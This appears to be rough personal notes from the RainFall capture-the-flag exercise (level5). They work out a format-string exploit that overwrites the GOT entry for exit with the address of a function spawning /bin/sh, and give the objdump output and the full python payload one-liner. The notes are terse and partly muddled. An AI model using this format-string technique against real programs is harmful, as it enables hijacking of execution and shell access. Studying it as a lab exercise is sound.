address de la function o that have the call to: /bin/sh-> 0x080484a4  :o()

we have exit function at the end of n() ; with adrress: 

```bash
    objdump -R ./level5
    08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
```

```sh
 -> objdump -d ./level5
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>

```

disas n


0x080484ff

level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")' > /tmp/out && (cat /tmp/out; cat) | ./level5 


0x080484a4

134513828
in decimale of 0x080484a4 is : 134513828 + 4
so we will arse the 

GOT : a data section that stores absolute memory addresses for external symbols and global variables
---------------------------------------------------------------
re- explanation
we can see the pyload:
------------------------------------------
objdump -R list: address that needs to be resolved 